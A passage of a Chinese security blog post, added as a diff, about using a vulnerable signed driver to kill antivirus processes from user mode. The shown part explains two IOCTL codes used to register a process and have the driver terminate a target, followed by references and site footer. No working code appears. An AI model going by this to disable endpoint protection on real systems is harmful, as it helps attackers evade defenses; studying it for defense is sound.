+<p>​    这里需要注意的是：<code>IOCTL_REGISTER_PROCESS</code> 和 <code>IOCTL_TERMINATE_PROCESS</code> 。 这两个通常用于与驱动程序进行交互的 IOCTL（Input/Output Control）控制码。</p>
+<ol>
+<li>IOCTL_REGISTER_PROCESS：这个 IOCTL 控制码通常用于向驱动程序注册进程信息。当用户空间应用程序需要与特定的驱动程序进行通信或进行特定操作时，可以通过向驱动程序发送 IOCTL_REGISTER_PROCESS 控制码来注册当前进程的信息，以便驱动程序可以识别和处理与该进程相关的请求。</li>
+<li>IOCTL_TERMINATE_PROCESS：这个 IOCTL 控制码通常用于向驱动程序发送终止进程的请求。用户空间应用程序可以通过向驱动程序发送 IOCTL_TERMINATE_PROCESS 控制码来请求驱动程序终止指定进程。驱动程序可以根据收到的请求执行相应的操作，例如终止进程的执行。</li>
+</ol>
+<p>​    这两个控制码通常取决于漏洞驱动，需要在驱动加载及执行相关操作的时候获取。</p>
+<p>​    如果上述流程顺利，就i可以通过在ring3层调用ring0层的函数去kill 指定进程了。</p>
+<p>​    更多知识建议详细阅读：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275999.htm">https://bbs.kanxue.com/thread-275999.htm</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904071917207566">https://juejin.cn/post/6844904071917207566</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cherrison-Time/p/12912899.html">https://www.cnblogs.com/Cherrison-Time/p/12912899.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/what-is-a-driver-">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/what-is-a-driver-</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/install/windows-driver-signing-tutorial">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/install/windows-driver-signing-tutorial</a></p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/darkb1rd">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Ring0-Ring3"><span class="toc-number">1.</span> <span class="toc-text">一、Ring0 - Ring3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API%E4%BB%8E%E5%BA%94%E7%94%A8%E5%B1%82%E5%88%B0%E5%86%85%E6%A0%B8%E5%B1%82%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">API从应用层到内核层调用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0ZW%E4%B8%8ENT%E5%8C%BA%E5%88%AB-%E4%BB%A5ZW%E3%80%81NT%E5%BC%80%E5%A4%B4%E7%9A%84Windows-api%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">函数ZW与NT区别(以ZW、NT开头的Windows api函数)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring3-%E4%B8%8E-Ring0-%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">Ring3 与 Ring0 的通信方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%99%A8%E6%97%A0%E6%B3%95KILL%E6%9D%80%E8%BD%AF%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">为什么进程管理器无法KILL杀软进程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%A9%B1%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">二、驱动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E7%AD%BE%E5%90%8D"><span class="toc-number">2.1.</span> <span class="toc-text">驱动签名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%A9%B1%E5%8A%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞驱动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">三、代码实现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&text=通过驱动 kill 杀软学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&is_video=false&description=通过驱动 kill 杀软学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通过驱动 kill 杀软学习&body=Check out this article: http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&name=通过驱动 kill 杀软学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&t=通过驱动 kill 杀软学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    darkb1rd
+  </div>
+<!--  <div class="footer-right">-->
+<!--    <nav>-->
+<!--      <ul>-->
+<!--        &lt;!&ndash;-->
+<!--       &ndash;&gt;<li><a href="/">首页</a></li>&lt;!&ndash;-->
+<!--     &ndash;&gt;&lt;!&ndash;-->
+<!--       &ndash;&gt;<li><a href="/about/">关于</a></li>&lt;!&ndash;-->
+<!--     &ndash;&gt;&lt;!&ndash;-->
+<!--       &ndash;&gt;<li><a href="/archives/">归档</a></li>&lt;!&ndash;-->
+<!--     &ndash;&gt;&lt;!&ndash;-->
+<!--       &ndash;&gt;<li><a target="_blank" rel="noopener" href="http://github.com/darkb1rd">项目</a></li>&lt;!&ndash;-->
+<!--     &ndash;&gt;-->
+<!--      </ul>-->
+<!--    </nav>-->
+<!--  </div>-->
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
